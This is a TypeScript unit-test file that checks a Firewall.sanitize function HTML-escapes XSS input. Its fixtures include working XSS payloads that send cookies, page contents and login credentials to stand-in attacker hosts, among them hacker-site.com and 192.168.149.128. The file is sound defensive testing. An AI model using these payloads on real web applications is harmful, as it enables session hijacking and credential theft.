import { describe, it } from 'mocha';
import { expect } from 'chai';
import { Firewall } from '../lib';

describe('sanitize spec', () => {
	it('sanitizes string with xss in tag', () => {
		// XSS Attack: Phishing to steal user credentials
		const stringWithXss =
			'<h3>Please login to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>';
		const sanitizedString = Firewall.sanitize(stringWithXss);
		const expectedStringAfterSanitize =
			'<h3>Please login to proceed</h3> &lt;form action=http://192.168.149.128&gt;Username:<br>&lt;input type="username" name="username"&gt;</br>Password:<br>&lt;input type="password" name="password"&gt;</br><br>&lt;input type="submit" value="Logon"&gt;</br>';
		expect(sanitizedString).to.not.be.eq(stringWithXss);
		expect(sanitizedString).to.be.eq(expectedStringAfterSanitize);
	});

	it('sanitizes string with xss in attr', () => {
		// XSS Attack: Steal user cookie
		const stringWithXss = '<button onclick=\'document.location= "http://www.example.com/cookie_catcher.php?c=" + document.cookie\'></button>';
		const sanitizedString = Firewall.sanitize(stringWithXss);
		const expectedStringAfterSanitize =
			'&lt;button onclick=\'document.location= "http://www.example.com/cookie_catcher.php?c=" + document.cookie\'&gt;&lt;/button&gt;';
		expect(sanitizedString).to.not.be.eq(stringWithXss);
		expect(sanitizedString).to.be.eq(expectedStringAfterSanitize);
	});

	it('sanitizes json with xss', () => {
		const jsonWithXss = {
			// XSS Attack: steal sensitive information
			name: '<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.body.innerHTML</script>',
			// XSS Attack: Steal user cookie
			surname: "<script>document.write('<img src=\"https://hacker-site.com/collect.gif?cookie=' + document.cookie + '\" />')</script>",
			// XSS Attack: Execute hacker script
			age: 'http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script src="http://192.168.149.128/xss.js">'
		};
		Firewall.sanitize(jsonWithXss);
		const expectedJsonAfterSanitize = {
			name: '&lt;script&gt;new Image().src="http://192.168.149.128/bogus.php?output="+document.body.innerHTML&lt;/script&gt;',
			surname: `&lt;script&gt;document.write('<img src="https://hacker-site.com/collect.gif?cookie=' + document.cookie + '" />')&lt;/script&gt;`,
			age: 'http://localhost:81/DVWA/vulnerabilities/xss_r/?name=&lt;script src="http://192.168.149.128/xss.js"&gt;'
		};
		expect(jsonWithXss).to.be.deep.eq(expectedJsonAfterSanitize);
	});

	it('skips specified paths and does not sanitize them', () => {
		const jsonWithXss = {
			str1: '<script></script>',
			num: 1,
			obj: {
				bool: true,
				str1: '<script></script>',
				arr: ['<script></script>', '<script></script>'],
				str2: '<script></script>'
			},
			str2: '<script></script>'
		};
		Firewall.sanitize(
			jsonWithXss,
			new Set<string>(['str1', 'obj.str1', 'obj.arr.[0]'])
		);
		expect(jsonWithXss.str1).to.be.eq('<script></script>');
		expect(jsonWithXss.num).to.be.eq(1);
		expect(jsonWithXss.obj.bool).to.be.eq(true);
		expect(jsonWithXss.obj.str1).to.be.eq('<script></script>');
		expect(jsonWithXss.obj.arr[0]).to.be.eq('<script></script>');
		expect(jsonWithXss.obj.arr[1]).to.be.eq('&lt;script&gt;&lt;/script&gt;');
		expect(jsonWithXss.obj.str2).to.be.eq('&lt;script&gt;&lt;/script&gt;');
		expect(jsonWithXss.str2).to.be.eq('&lt;script&gt;&lt;/script&gt;');
	});
});
